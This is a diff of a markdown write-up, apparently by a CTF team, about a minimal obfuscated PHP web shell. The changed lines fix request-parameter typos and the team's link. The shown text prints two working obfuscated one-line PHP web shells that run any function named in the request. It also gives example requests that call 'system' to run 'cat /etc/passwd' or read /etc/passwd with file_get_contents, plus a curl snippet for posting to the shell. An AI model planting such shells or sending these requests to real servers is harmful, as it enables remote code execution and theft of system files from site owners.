@@ -53,7 +53,7 @@ Thats quite cool but its so fucking huge so i tough i would optimize the hell ou
 <?=$_=[]..1;$_=${$_[6].$_[3].$_[4].$_[3].$_[3]^($_^$_[5]).+1625};$_[0]($_[1]);
 ```
 
-So you can send a request such as ```0=system&1_=cat /etc/passwd```
+So you can send a request such as ```0=system&1=cat /etc/passwd```
 
 The downside is that if you dont have access to the system function you got no return values
 so here is another slightly bigger variation of the shell which will print the result of a function.
@@ -62,7 +62,7 @@ so here is another slightly bigger variation of the shell which will print the r
 <?=$_=[]..1;$_=${$_[6].$_[3].$_[4].$_[3].$_[3]^($_^$_[5]).+1625};$_[0]($_[1]($_[2]));
 ```
 
-So you can send a request such as ```0=print_r&1=file_get_contents&2_=/etc/passwd```
+So you can send a request such as ```0=print_r&1=file_get_contents&2=/etc/passwd```
 
 Here are small curl snippets for you lazy folks to work with the shell :D
 
@@ -87,4 +87,4 @@ curl https://host.ctf.com/shell.php -X POST -F "0=print_r" -F "1=call_user_func_
 
 Cli-Ish over and out.
 
-PS: Checkout our cool team page https://pwnprophecy.tk
+PS: Checkout our cool team page https://pwnprophecy.xyz
